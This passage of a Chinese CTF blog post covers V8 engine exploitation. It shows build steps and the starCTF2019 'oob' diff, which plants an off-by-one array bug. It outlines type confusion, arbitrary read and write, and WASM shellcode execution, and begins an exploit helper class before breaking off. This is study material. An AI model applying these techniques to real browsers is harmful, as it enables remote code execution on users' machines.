<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="之前一直以为V8 Pwn是很高深莫测的东西，学了之后发现和PHP Pwn差不多，基本都是通过出题人自己定义的方法上的漏洞进行利用，php pwn是so的拓展，V8是diff文件。当然还有一些直接用CVE出题的 V8基础环境搭建和动态调试网上有很多写的很详细，这里就不详细讲了，主要注意一下js 的object的结构体就行  做题时一般出题人会给diff文件和对应的V8版本，退回到之前的版本加上dif">
<meta property="og:type" content="article">
<meta property="og:title" content="V8 Pwn的学习">
<meta property="og:url" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/index.html">
<meta property="og:site_name" content="PuH4ck3rX&#39;s Blog">
<meta property="og:description" content="之前一直以为V8 Pwn是很高深莫测的东西，学了之后发现和PHP Pwn差不多，基本都是通过出题人自己定义的方法上的漏洞进行利用，php pwn是so的拓展，V8是diff文件。当然还有一些直接用CVE出题的 V8基础环境搭建和动态调试网上有很多写的很详细，这里就不详细讲了，主要注意一下js 的object的结构体就行  做题时一般出题人会给diff文件和对应的V8版本，退回到之前的版本加上dif">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/4.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204044422366.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204045753268.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204050741195.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204050912649.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204051408805.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/1.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208203420035.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/971428_VMV4QRAKRMGNV3T.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/971428_9YEA5TJU9N9S5QS.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208204255697.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208210311870.png">
<meta property="og:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208210356932.png">
<meta property="article:published_time" content="2025-04-29T06:00:00.000Z">
<meta property="article:modified_time" content="2025-12-08T13:45:00.295Z">
<meta property="article:author" content="PuH4ck3rX">
<meta property="article:tag" content="V8">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/4.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>V8 Pwn的学习</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">h0m3</a></li><!--
     --><!--
       --><li><a href="/about/">ab0ut</a></li><!--
     --><!--
       --><li><a href="/archives/">art1cl3s</a></li><!--
     --><!--
       --><li><a href="/links/">l1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s3arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&text=V8 Pwn的学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&title=V8 Pwn的学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&is_video=false&description=V8 Pwn的学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=V8 Pwn的学习&body=Check out this article: http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&title=V8 Pwn的学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&title=V8 Pwn的学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&title=V8 Pwn的学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&title=V8 Pwn的学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&name=V8 Pwn的学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/&t=V8 Pwn的学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#V8%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">V8基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#starCTF2019-OOB"><span class="toc-number">2.</span> <span class="toc-text">starCTF2019-OOB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Google-CTF-2018-Just-In-Time"><span class="toc-number">3.</span> <span class="toc-text">Google CTF 2018 Just-In-Time</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">具体利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-4069%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">CVE-2023-4069复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-number">4.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E8%B7%AF%E5%BE%84%E7%9A%84%E5%88%86%E9%85%8D%E6%B5%81%E7%A8%8B"><span class="toc-number">4.2.1.</span> <span class="toc-text">快速路径的分配流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#diff%E5%88%86%E6%9E%90"><span class="toc-number">4.2.2.</span> <span class="toc-text">diff分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp%E7%BC%96%E5%86%99"><span class="toc-number">4.2.3.</span> <span class="toc-text">exp编写</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        V8 Pwn的学习
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">PuH4ck3rX</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-04-29T06:00:00.000Z" class="dt-published" itemprop="datePublished">2025-04-29</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/V8/">V8</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Pwn/" rel="tag">Pwn</a>, <a class="p-category" href="/tags/V8/" rel="tag">V8</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>之前一直以为V8 Pwn是很高深莫测的东西，学了之后发现和PHP Pwn差不多，基本都是通过出题人自己定义的方法上的漏洞进行利用，php pwn是so的拓展，V8是diff文件。当然还有一些直接用CVE出题的</p>
<h3 id="V8基础"><a href="#V8基础" class="headerlink" title="V8基础"></a>V8基础</h3><p>环境搭建和动态调试网上有很多写的很详细，这里就不详细讲了，主要注意一下js 的object的结构体就行</p>
<p><img src="/2025/04/29/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/4.png" alt="img"></p>
<p>做题时一般出题人会给diff文件和对应的V8版本，退回到之前的版本加上diff文件构建就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard id</span><br><span class="line">gclient sync</span><br><span class="line">git apply &lt; patch.diff</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br><span class="line">tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C out.gn/x64.release d8</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面记录一下自己刷的V8题</p>
<h3 id="starCTF2019-OOB"><a href="#starCTF2019-OOB" class="headerlink" title="starCTF2019-OOB"></a>starCTF2019-OOB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">gclient sync</span><br><span class="line">git apply &lt; oob.diff</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br><span class="line">tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C out.gn/x64.release d8</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line">--- a/src/bootstrapper.cc</span><br><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="line">+                          Builtins::kArrayOob,2,false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len = args.length();</span><br><span class="line">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+    if(len == 1)&#123;</span><br><span class="line">+        //read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;else&#123;</span><br><span class="line">+        //write</span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+        elements.set(length,value-&gt;Number());</span><br><span class="line">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 0447230..f113a81 100644</span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ -368,6 +368,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index ed1e4a5..c199e3a 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtins::kArrayOob:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>diff文件定义了一个oob方法，漏洞点在将数组元素和数组长度混淆了，导致会溢出1的元素，有点像off by one</p>
<p>oob()无参数时会返回elements[length]的值，带参数时会将参数写入elements[length]</p>
<p>通过调试可以发现float类型和obj类型的数组他们的elements是挨着他们的map的，所以刚好可以泄露map和往map里写数据，这里就可以构造一个类型混淆，通过混淆float类型的数组为obj可以在任意地址伪造一个fake_obj，将obj类型的数组混淆为float可以泄露obj数组储存的对象的地址，那么这样就可以通过自己伪造一个数组然后控制element进行任意地址读写了，最后通过改ArrayBuffer的backing_store的地址 在WasmInstance开辟的rwx内存写shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8)</span><br><span class="line">    this.f64 = new Float64Array(this.buf)</span><br><span class="line">    this.f32 = new Float32Array(this.buf)</span><br><span class="line">    this.u32 = new Uint32Array(this.buf)</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf)</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf)</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;</span><br><span class="line">    this.i = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f64toi64(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i64tof64(i) &#123;</span><br><span class="line">    this.u64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → int64</span><br><span class="line">  f64toi64signed(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.i64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64</span><br><span class="line">  i64tof64signed(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f64toi32lo(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f64toi32hi(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64 </span><br><span class="line">  i32pairtof64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i64to32lo(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i64to32hi(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i</span><br><span class="line">    return this.f32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span 